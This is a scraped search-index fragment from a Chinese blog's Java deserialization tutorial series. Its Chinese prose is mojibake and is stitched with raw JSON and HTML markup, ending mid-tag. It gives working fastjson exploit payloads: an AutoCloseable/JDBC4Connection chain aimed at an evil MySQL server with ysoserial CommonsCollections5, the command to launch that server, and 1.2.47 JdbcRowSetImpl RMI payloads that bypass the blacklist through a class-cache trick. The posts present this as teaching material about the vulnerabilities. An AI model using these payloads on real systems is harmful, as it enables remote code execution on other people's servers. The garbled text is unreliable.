å¯ä»¥çœ‹åˆ°åœ¨å¤„ç†â€œå¤§å­—ç¬¦ä¸²â€æ—¶ä¼šè¿›è¡Œååºåˆ—åŒ–ï¼Œå½“ JDBC é¦–æ¬¡è¿æ¥MySQLæœåŠ¡å™¨æ—¶ï¼Œä¼šä¸»åŠ¨ä½¿ç”¨sqlæŸ¥è¯¢ï¼ˆä¸åŒç‰ˆæœ¬çš„JDBCæŸ¥è¯¢çš„å†…å®¹ç•¥æœ‰ä¸åŒï¼‰ï¼Œæ¶æ„MysqlæœåŠ¡å™¨å³å¯è¿”å›æˆ‘ä»¬æ„é€ å¥½çš„æ¶æ„æ•°æ®ï¼Œæœ€åå°±å¯ä»¥è§¦å‘ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚\næ¶æ„MySQLæœåŠ¡å¯ä»¥ä½¿ç”¨ python3å®ç°çš„ https://github.com/fnmsd/MySQL_Fake_Server\nä¹Ÿå¯ä»¥ä½¿ç”¨æˆ‘å‚è€ƒ MySQL_Fake_Server åç”¨ Go å®ç°çš„ https://github.com/dushixiang/evil-mysql-server\nä»¥ mysql-connector-java 5.1.11 ä¸ºä¾‹ï¼Œå…ˆå¯åŠ¨æ¶æ„Mysql æœåŠ¡ç«¯ã€‚\nè¿™é‡Œæ²¡æœ‰ä½¿ç”¨è‡ªå·±æ„é€ æ¶æ„æ•°æ®ï¼Œè€Œæ˜¯ä½¿ç”¨äº†ä¸€ä¸ªå¼€æºçš„ Java ååºåˆ—åŒ–å·¥å…· ysoserial\n./evil-mysql-server -addr 3306 -java java -ysoserial ysoserial-0.0.6-SNAPSHOT-all.jar æµ‹è¯•ä»£ç  éœ€è¦pomä¾èµ–ä¸­å­˜åœ¨ commons-collections 3.1\nimport com.alibaba.fastjson.JSON; public class Evil6 { public static void main(String[] args) { // 5.1.11-5.1.48(ååºåˆ—åŒ–é“¾) String json = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;: \\\u0026#34;java.lang.AutoCloseable\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;: \\\u0026#34;com.mysql.jdbc.JDBC4Connection\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;hostToConnectTo\\\u0026#34;: \\\u0026#34;127.0.0.1\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;portToConnectTo\\\u0026#34;: 3306,\\n\u0026#34; + \u0026#34; \\\u0026#34;info\\\u0026#34;: {\\n\u0026#34; + \u0026#34; \\\u0026#34;user\\\u0026#34;: \\\u0026#34;yso_CommonsCollections5_calc\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;password\\\u0026#34;: \\\u0026#34;pass\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;statementInterceptors\\\u0026#34;: \\\u0026#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;autoDeserialize\\\u0026#34;: \\\u0026#34;true\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;NUM_HOSTS\\\u0026#34;: \\\u0026#34;1\\\u0026#34;\\n\u0026#34; + \u0026#34; },\\n\u0026#34; + \u0026#34; \\\u0026#34;databaseToConnectTo\\\u0026#34;: \\\u0026#34;dbname\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;url\\\u0026#34;: \\\u0026#34;\\\u0026#34;\\n\u0026#34; + \u0026#34;}\u0026#34;; JSON.parseObject(json); } } è¿è¡Œä¹‹åä¾¿å¯ä»¥çœ‹åˆ°æœ¬æœºæ‰“å¼€äº†è®¡ç®—å™¨ï¼Œå…¶ä»–ç‰ˆæœ¬çš„ mysql-connector-java ä¹Ÿç±»ä¼¼ï¼Œå¯ä»¥è‡ªè¡ŒæŒ–æ˜æ›´å¤šåˆ©ç”¨é“¾ã€‚\næ³¨ æ–‡ä¸­æµ‹è¯•ä½¿ç”¨ç³»ç»Ÿå’Œå·¥å…·ç‰ˆæœ¬å¦‚ä¸‹ï¼š\næ“ä½œç³»ç»Ÿ windows 10 20H2 jdk java 1.8.0_301 fastjson 1.2.68 commons-collections 3.1 ysoserial 0.0.6-SNAPSHOT ä»£ç ä»“åº“ https://github.com/dushixiang/java-serialization-vulnerability å‚è€ƒ https://www.buaq.net/go-82366.html ","permalink":"https://www.typesafe.cn/posts/java-serialization-vulnerability-6/","summary":"\u003ch2 id=\"å£°æ˜\"\u003eå£°æ˜\u003c/h2\u003e\n\u003cp\u003eæœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚\u003c/p\u003e\n\u003ch2 id=\"fastjson--1268-expectclass-ç»•è¿‡åŸç†\"\u003eFastjson \u0026lt;= 1.2.68 expectClass ç»•è¿‡åŸç†\u003c/h2\u003e\n\u003cp\u003eå½“ fastjson æ›´æ–°åˆ° 1.2.68 ä¹‹åï¼Œå¤§éƒ¨åˆ†å®‰å…¨æ¼æ´éƒ½å·²ç»å°å µä½äº†ï¼Œä½†ä¸æ’é™¤è¿˜æœ‰äººæ‰‹é‡Œæ¡ç€ä¸€äº› 0day æ²¡æœ‰æ”¾å‡ºæ¥ã€‚\u003c/p\u003e\n\u003cp\u003efastjson 1.2.68 åœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šè¿›å…¥ \u003ccode\u003eObjectDeserializer\u003c/code\u003e çš„ \u003ccode\u003edeserialze\u003c/code\u003e æ–¹æ³•ï¼Œè€Œ å®‰å…¨äººå‘˜å‘ç° å½“ \u003ccode\u003e@type\u003c/code\u003e ä¸º \u003ccode\u003ejava.lang.AutoCloseable\u003c/code\u003e çš„æ—¶å€™ä¼šæ‰¾åˆ°å®ç°ç±» \u003ccode\u003eJavaBeanDeserializer\u003c/code\u003e è°ƒç”¨ \u003ccode\u003edeserialze\u003c/code\u003eï¼Œè€Œ \u003ccode\u003eJavaBeanDeserializer\u003c/code\u003e çš„ \u003ccode\u003edeserialze\u003c/code\u003e æ–¹æ³•è¿˜ä¼šç»§ç»­è§£æå¾—åˆ°ç¬¬äºŒä¸ª \u003ccode\u003e@type\u003c/code\u003e å¯¹åº”çš„å€¼è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶ä¸” \u003ccode\u003eexpectClass\u003c/code\u003e åˆ™ä¸å†æ˜¯ \u003ccode\u003enull\u003c/code\u003e å€¼ï¼Œè€Œæ˜¯ \u003ccode\u003ejava.lang.AutoCloseable\u003c/code\u003eã€‚\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eJavaBeanDeserializer\u003c/code\u003e çš„ \u003ccode\u003edeserialze\u003c/code\u003e éƒ¨åˆ†ä»£ç ç¤ºä¾‹ã€‚\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eif (lexer.token() == JSONToken.LITERAL_STRING) {\n    // ç¬¬äºŒä¸ª @type çš„å€¼\n    String typeName = lexer.stringVal();\n    lexer.nextToken(JSONToken.COMMA);\n\n    if (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) {\n        if (lexer.token() == JSONToken.RBRACE) {\n            lexer.nextToken();\n            break;\n        }\n        continue;\n    }\n    \n    // è¿™é‡Œæ²¡æœ‰è·å–åˆ° deserializer\n    ObjectDeserializer deserializer = getSeeAlso(config, this.beanInfo, typeName);\n    Class\u0026lt;?\u0026gt; userType = null;\n\n    if (deserializer == null) {\n        // ç¬¬ä¸€ä¸ª @type çš„å€¼ \n        Class\u0026lt;?\u0026gt; expectClass = TypeUtils.getClass(type);\n        // åœ¨åŒ…å« expectClass æ—¶ä¼šç»•è¿‡\n        userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());\n        deserializer = parser.getConfig().getDeserializer(userType);\n    }\n    \n    // å†æ¬¡è¿›è¡Œååºåˆ—åŒ–ï¼Œä¼šè§¦å‘åå°„æ„é€ å®ä¾‹\n    Object typedObject = deserializer.deserialze(parser, userType, fieldName);\n    if (deserializer instanceof JavaBeanDeserializer) {\n        JavaBeanDeserializer javaBeanDeserializer = (JavaBeanDeserializer) deserializer;\n        if (typeKey != null) {\n            FieldDeserializer typeKeyFieldDeser = javaBeanDeserializer.getFieldDeserializer(typeKey);\n            if (typeKeyFieldDeser != null) {\n                typeKeyFieldDeser.setValue(typedObject, typeName);\n            }\n        }\n    }\n    return (T) typedObject;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eParseConfig\u003c/code\u003e çš„ \u003ccode\u003echeckAutoType\u003c/code\u003e éƒ¨åˆ†ä»£ç ç¤ºä¾‹ï¼Œåªè¦ç¬¬äºŒä¸ª \u003ccode\u003e@type\u003c/code\u003e ç»§æ‰¿äº† ç¬¬ä¸€ä¸ª \u003ccode\u003e@type\u003c/code\u003e å³å¯è§¦å‘ã€‚\u003c/p\u003e","title":"Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆå…­ï¼‰fastjson 1.2.68 ç»•è¿‡åŸç†"},{"content":"å£°æ˜ æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚\nFastjson \u0026lt;= 1.2.47 POC éšç€ fastjson çš„æ›´æ–°ï¼Œä»¥å¾€çš„å®‰å…¨æ¼æ´éƒ½è¢«å°å µæ‰äº†ï¼Œä½†é“é«˜ä¸€å°ºï¼Œé­”é«˜ä¸€ä¸ˆï¼Œå®‰å…¨äººå‘˜å‘ç°äº†ä¸€ä¸ªé€šæ€çš„æ¼æ´ï¼Œä»¥å¾€çš„å°å µæ‰‹æ®µéƒ½å¯ä»¥ç»•è¿‡ï¼Œç®—æ˜¯ä¸€ä¸ªé‡Œç¨‹ç¢‘çš„å‘ç°ã€‚\næˆ‘ä»¬é¦–å…ˆå°† fastjson å‡çº§åˆ° 1.2.47 ç‰ˆæœ¬ï¼Œç„¶åä½¿ç”¨æˆ‘ä»¬ä¹‹å‰çš„POCè¿›è¡Œæµ‹è¯•ã€‚\nimport com.alibaba.fastjson.JSON; public class Eval3 { public static void main(String[] args) throws Exception { String payload = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://localhost:1099/Exploit\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:true}\u0026#34;; JSON.parse(payload); } } ä¸å‡ºæ„æ–™çš„è¯ä¼šå‡ºç°è¿™æ ·çš„é”™è¯¯æç¤ºä¿¡æ¯ï¼š\nautoType is not support. com.sun.rowset.JdbcRowSetImpl è¿™æ˜¯å› ä¸º fastjson ä½¿ç”¨äº†é»‘åå•æœºåˆ¶ï¼Œç¦æ­¢å°† com.sun.rowset.JdbcRowSetImpl ååºåˆ—åŒ–ã€‚\nä¸‹é¢æˆ‘ä»¬ä½¿ç”¨æ–°çš„ POC è¿›è¡Œæµ‹è¯•ï¼Œåˆå¯ä»¥åˆ©ç”¨æˆåŠŸäº†ã€‚\nimport com.alibaba.fastjson.JSON; public class Eval5 { public static void main(String[] args) throws Exception { String payload = \u0026#34;{\\\u0026#34;a\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;},\\\u0026#34;b\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://localhost:1099/Exploit\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:true}}\u0026#34;; JSON.parse(payload); } } payload æ ¼å¼åŒ–ä¹‹åå¦‚ä¸‹ï¼š\n{ \u0026#34;a\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Class\u0026#34;, \u0026#34;val\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34; }, \u0026#34;b\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;: \u0026#34;rmi://localhost:1099/Exploit\u0026#34;, \u0026#34;autoCommit\u0026#34;: true } } Fastjson \u0026lt;= 1.2.47 ç»•è¿‡åŸç† åœ¨å­¦ä¹ ç»•è¿‡åŸç†ä¹‹å‰ï¼Œäº†è§£ fastjson çš„åŸºæœ¬è§£ææµç¨‹è¿˜æ˜¯æœ‰å¿…è¦çš„ï¼Œæˆ‘ç”»äº†ä¸€å¼ ç±»å›¾ä»…ä¾›å‚è€ƒï¼Œå›¾ä¸­åªç”»äº†ä¸»è¦æµç¨‹ï¼Œè¿˜æœ‰å¾ˆå¤šç±»æ²¡æœ‰ç”»ã€‚\nä¸Šé¢æˆ‘ä»¬å·²ç»å‘ç°ç”¨ä¸Šä¸€èŠ‚æ„é€ çš„ payload å·²ç»æ— æ³•é€šè¿‡ï¼Œå°±æ˜¯å› ä¸ºåœ¨è°ƒç”¨ ParserConfig.checkAutoType è¿”å›çš„ã€‚\nå®‰å…¨äººå‘˜é€šè¿‡å®¡è®¡æºç å‘ç°ï¼Œå½“JSONå¯¹è±¡çš„ç±»å‹æ˜¯java.lang.Classï¼Œå¹¶ä¸”å­˜åœ¨ val å­—æ®µæ—¶ï¼Œfastjson ä¼šå°†å…¶è§£æè½¬æ¢å¾—åˆ°å­—ç¬¦ä¸²ï¼ˆå®Œæ•´åŒ…åï¼‰ï¼Œå¹¶å°† val å¯¹åº”çš„ç±»åŠ è½½åˆ°ç¼“å­˜ä¸­ï¼Œè€Œ checkAutoType æ–¹æ³•ä¸­ï¼Œå¦‚æœä»ç¼“å­˜ä¸­è·å–åˆ°äº† Class å°±ä¼šç›´æ¥è¿”å›ï¼Œä¸ä¼šå†è¿›è¡Œä¸‹é¢çš„é»‘åå•æ ¡éªŒã€‚\nä»¥æˆ‘ä»¬æ„é€ çš„ payload ä¸ºä¾‹ï¼Œé¦–å…ˆä¼šè§£æ\n{ \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Class\u0026#34;, \u0026#34;val\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34; } å› ä¸º @type æ˜¯ java.lang.Class æ‰€ä»¥é€šè¿‡äº† checkAutoType æ ¡éªŒï¼Œè¿›å…¥ com.alibaba.fastjson.serializer.MiscCodec çš„ deserialze æ–¹æ³•ï¼Œä¸‹é¢æ˜¯ deserialze æ–¹æ³•çš„éƒ¨åˆ†ä»£ç ã€‚\npublic \u0026lt;T\u0026gt; T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) { JSONLexer lexer = parser.lexer; // ä»£ç çœç•¥ Object objVal; if (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) { parser.resolveStatus = DefaultJSONParser.NONE; parser.accept(JSONToken.COMMA); if (lexer.token() == JSONToken.LITERAL_STRING) { if (!\u0026#34;val\u0026#34;.equals(lexer.stringVal())) { throw new JSONException(\u0026#34;syntax error\u0026#34;); } lexer.nextToken(); } else { throw new JSONException(\u0026#34;syntax error\u0026#34;); } parser.accept(JSONToken.COLON); // è§£æ val å­—æ®µ objVal = parser.parse(); parser.accept(JSONToken.RBRACE); } else { objVal = parser.parse(); } String strVal; if (objVal == null) { strVal = null; } else if (objVal instanceof String) { // è½¬æ¢ä¸º String ç±»å‹ strVal = (String) objVal; } else { // ä»£ç å¿½ç•¥ } // ä»£ç çœç•¥ // è¿™ä¸ª clazz æ˜¯æˆ‘ä»¬åœ¨ @type ä¸­æŒ‡å®šçš„ç±»å‹ï¼Œå› æ­¤æ˜¯æ»¡è¶³è¿™ä¸ªæ¡ä»¶çš„ if (clazz == Class.class) { return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader()); } // ä»£ç çœç•¥ } è€Œ com.alibaba.fastjson.util.TypeUtils.java æœ€ç»ˆè°ƒç”¨çš„æ–¹æ³•å¦‚ä¸‹ï¼š\npublic static Class\u0026lt;?\u0026gt; loadClass(String className, ClassLoader classLoader) { return loadClass(className, classLoader, true); } å¯ä»¥çœ‹åˆ° cache å‚æ•°æ˜¯ trueã€‚\npublic static Class\u0026lt;?\u0026gt; loadClass(String className, ClassLoader classLoader, boolean cache) { // ä»£ç å¿½ç•¥ try{ if(classLoader != null){ clazz = classLoader.loadClass(className); if (cache) { // è¿™é‡Œç¼“å­˜äº† com.sun.rowset.JdbcRowSetImpl åˆ° mappings ä¸­ mappings.put(className, clazz); } return clazz; } } catch(Throwable e){ e.printStackTrace(); // skip } try{ ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); if(contextClassLoader != null \u0026amp;\u0026amp; contextClassLoader != classLoader){ clazz = contextClassLoader.loadClass(className); if (cache) { // è¿™é‡Œç¼“å­˜äº† com.sun.rowset.JdbcRowSetImpl åˆ° mappings ä¸­ mappings.put(className, clazz); } return clazz; } } catch(Throwable e){ // skip } try{ clazz = Class.forName(className); mappings.put(className, clazz); return clazz; } catch(Throwable e){ // skip } return clazz; } è§£æå®Œç¬¬ä¸€ä¸ªJSONå¯¹è±¡åï¼Œå¼€å§‹è§£æç¬¬äºŒä¸ªJSONå¯¹è±¡ã€‚\n{ \u0026#34;@type\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;: \u0026#34;rmi://localhost:1099/Exploit\u0026#34;, \u0026#34;autoCommit\u0026#34;: true } æˆ‘ä»¬ç›´æ¥çœ‹ com.alibaba.fastjson.parser.ParseConfig.checkAutoType çš„ä»£ç :\npublic Class\u0026lt;?\u0026gt; checkAutoType(String typeName, Class\u0026lt;?\u0026gt; expectClass, int features) { // ä»£ç å¿½ç•¥ ... if (clazz == null) { // è¿™é‡Œä» mapping ä¸­é€šè¿‡ç±»åç§°è·å–ç±»ï¼Œå› ä¸ºåœ¨å¤„ç†ç¬¬ä¸€ä¸ªJSONå¯¹è±¡çš„æ—¶å€™å·²ç»æŠŠ com.sun.rowset.JdbcRowSetImpl put è¿›å»äº†ï¼Œå› æ­¤è¿™é‡Œä¸€å®šæ˜¯å¯ä»¥è·å–åˆ° Class çš„ clazz = TypeUtils.getClassFromMapping(typeName); } // ä¸ä¼šè¿›å…¥è¿™ä¸ªåˆ¤æ–­ if (clazz == null) { clazz = deserializers.findClass(typeName); } // è¿›å…¥è¿™ä¸ªåˆ¤æ–­ if (clazz != null) { // æ ¹æ®å‚æ•°è°ƒç”¨å¾—å‡º expectClass æ˜¯ nullï¼Œä¹Ÿä¸ä¼šè¿›å…¥è¿™ä¸ªåˆ¤æ–­ if (expectClass != null \u0026amp;\u0026amp; clazz != java.util.HashMap.class \u0026amp;\u0026amp; !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\u0026#34;type not match. \u0026#34; + typeName + \u0026#34; -\u0026gt; \u0026#34; + expectClass.getName()); } // ç›´æ¥è¿”å› Class return clazz; } // ä»£ç çœç•¥ï¼Œä¸‹é¢çš„é»‘åå•åˆ¤æ–­å·²ç»ä¸é‡è¦äº† return clazz; } å¯ä»¥çœ‹åˆ°åœ¨ç¼“å­˜ä¸­è·å–åˆ° Class å¯¹è±¡åç›´æ¥ return å‡ºå»äº†ï¼Œä¸‹é¢çš„é»‘åå•æ ¡éªŒå¹¶æ²¡æœ‰è¿›è¡Œï¼Œä¹‹åçš„é€»è¾‘å°±æ˜¯æ„é€ å®ä¾‹ï¼Œå‘å‡º JNDI è¯·æ±‚ï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°äº†ã€‚\n","permalink":"https://www.typesafe.cn/posts/java-serialization-vulnerability-5/","summary":"\u003ch2 id=\"å£°æ˜\"\u003eå£°æ˜\u003c/h2\u003e\n\u003cp\u003eæœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚\u003c/p\u003e\n\u003ch2 id=\"fastjson--1247-poc\"\u003eFastjson \u0026lt;= 1.2.47 POC\u003c/h2\u003e\n\u003cp\u003eéšç€ fastjson çš„æ›´æ–°ï¼Œä»¥å¾€çš„å®‰å…¨æ¼æ´éƒ½è¢«å°å µæ‰äº†ï¼Œä½†é“é«˜ä¸€å°ºï¼Œé­”é«˜ä¸€ä¸ˆï¼Œå®‰å…¨äººå‘˜å‘ç°äº†ä¸€ä¸ªé€šæ€çš„æ¼æ´ï¼Œä»¥å¾€çš„å°å µæ‰‹æ®µéƒ½å¯ä»¥ç»•è¿‡ï¼Œç®—æ˜¯ä¸€ä¸ªé‡Œç¨‹ç¢‘çš„å‘ç°ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬é¦–å…ˆå°† fastjson å‡çº§åˆ° 1.2.47 ç‰ˆæœ¬ï¼Œç„¶åä½¿ç”¨æˆ‘ä»¬ä¹‹å‰çš„POCè¿›è¡Œæµ‹è¯•ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e com.alibaba.fastjson.JSON;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eEval3\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estatic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e(String\u003cspan style=\"color:#f92672\"\u003e[]\u003c/span\u003e args) \u003cspan style=\"color:#66d9ef\"\u003ethrows\u003c/span\u003e Exception {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        String payload \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://localhost:1099/Exploit\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:true}\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        JSON.\u003cspan style=\"color:#a6e22e\"\u003eparse\u003c/span\u003e(payload);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸å‡ºæ„æ–™çš„è¯ä¼šå‡ºç°è¿™æ ·çš„é”™è¯¯æç¤ºä¿¡æ¯ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eautoType is not support. com.sun.rowset.JdbcRowSetImpl\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ˜¯å› ä¸º fastjson ä½¿ç”¨äº†é»‘åå•æœºåˆ¶ï¼Œç¦æ­¢å°† \u003ccode\u003ecom.sun.rowset.JdbcRowSetImpl\u003c/code\u003e ååºåˆ—åŒ–ã€‚\u003c/p\u003e\n\u003cp\u003eä¸‹é¢æˆ‘ä»¬ä½¿ç”¨æ–°çš„ POC è¿›è¡Œæµ‹è¯•ï¼Œåˆå¯ä»¥åˆ©ç”¨æˆåŠŸäº†ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e com.alibaba.fastjson.JSON;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eEval5\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estatic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e(String\u003cspan style=\"color:#f92672\"\u003e[]\u003c/span\u003e args) \u003cspan style=\"color:#66d9ef\"\u003ethrows\u003c/span\u003e Exception {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        String payload \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{\\\u0026#34;a\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;},\\\u0026#34;b\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://localhost:1099/Exploit\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:true}}\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        JSON.\u003cspan style=\"color:#a6e22e\"\u003eparse\u003c/span\u003e(payload);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003epayload æ ¼å¼åŒ–ä¹‹åå¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;a\u0026#34;\u003c/span\u003e: {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;@type\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;java.lang.Class\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;val\u0026#34;\u003c/span\u003e: \u003cspan 